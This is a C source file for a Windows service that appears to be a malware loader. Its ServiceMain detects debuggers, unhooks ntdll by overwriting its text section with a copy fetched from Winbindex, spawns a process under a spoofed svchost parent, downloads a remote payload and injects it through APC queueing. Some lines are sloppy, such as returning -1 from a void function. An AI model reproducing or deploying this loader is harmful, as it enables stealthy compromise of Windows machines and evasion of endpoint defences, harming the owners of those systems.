#include "Service.h"

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv) {
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        return;
    }

    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    HANDLE	hParentProcess = NULL,
            hProcess = NULL,
            hThread = NULL;
    DWORD	dwPPid;

    SIZE_T	Size = NULL;
    PBYTE	Bytes = NULL;

    PVOID   pNtdll = NULL;

    if (IsDebuggerPresentRpl())
        return -1;

    if (!ReadNtdllFromWinbindex(&pNtdll))
        return -1;

    if (!ReplaceNtdllTextSection(pNtdll))
        return -1;

    LocalFree(pNtdll);

    GetProcessHandle(L"svchost.exe", &dwPPid, &hParentProcess);

    if (!CreateRuntimeBrokerProcess(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, hParentProcess, &hProcess, &hThread))
        return -1;
    SuspendThread(hThread);

    PayloadStagingFromWeb(PAYLOAD, &Bytes, &Size);

    ApcPayloadInjection(hProcess, hThread, Bytes, Size);

    ResumeThread(hThread);

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);

    return;
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    default:
        break;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}